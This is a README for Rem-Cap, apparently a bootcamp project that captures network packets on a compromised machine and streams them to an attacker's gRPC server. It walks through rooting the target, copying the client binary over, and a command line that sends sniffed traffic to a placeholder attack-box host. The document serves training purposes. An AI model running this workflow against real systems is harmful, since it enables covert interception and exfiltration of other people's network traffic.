# Rem-Cap 

Final project for the GA tech Cyber-Security bootcamp

Remotely capture network packets using a client-streaming gRPC API.

## How it works

The attack box runs the gRPC server.

Once the attacker has rooted the target machine, he/she `scp`'s the client binary and the trust certificate over from the attack box.

The attacker runs the client binary on the target machine specifying : 

- which network interfaces he/she would like to packet sniff
- the amount of time to sniff packets on those interfaces
- the address and port the attack box is running the gRPC server to stream sniffed packets to
- the path to the certificate

The server keeps track of which packets came from which client stream.

server-side logging shows the connection status of any clients and the number of packets captured from that particular connection.

client-side logging shows how much time has elapsed out of the total session time as well as how
many packets have been captured.

When a client's session time is up, the connection is closed and a session summary is received from the server.

After the server sends the session summary off, it writes all the captured packets to disk in the form of a pcap file located in `server/pcaps/` .

The pcap file can then be analyzed in wireshark.

## Compiling

The creation of certificates, keys, and both remcap binaries ( server and client ) can be automated with the `remcap` target in the Makefile.

``Example`` :

    make remcap pw=test host=localhost

All generated certificates and keys will be saved into a new `ssl/` dir

## Server Usage

    Usage:

    remcap [flags]

    Flags:
        --cert          string        Path to signed certificate
    -h, --help                        help for remcap
        --key           string        Path to server private key
    -o, --out           string        Specify out file
    -p, --port          string        Port to start Remcap server


## Running Server

    ./remcap_server --cert=ssl/server.crt --key=ssl/server.pem -p 4444

## Client Usage

    Usage:
    remcap [flags] [command]

    Available Commands:
    bpf         Apply Berkely Packet Filters
    help        Help about any command

    Flags:
        --cert      string      Path to trust cert from CA
    -d, --devices   strings     Network interfaces to sniff
    -h, --help                  Help for remcap
        --host      string      <ip>:<port> of attack box to stream packets to
        --hours     int         Amount of hours to run capture
    -m, --minutes   int         Amount of minutes to run capture
    -s, --seconds   int         Amount of seconds to run capture

## Running client :

`Pre-reqs` :

- Remote into target machine and escalate to root 
- `scp` the client binary ( `remcap` ) and the `ca.crt` file over

then....

        ./remcap -s 10 -d en0 --host ipofattackbox:portofserver --cert /path/to/ca.crt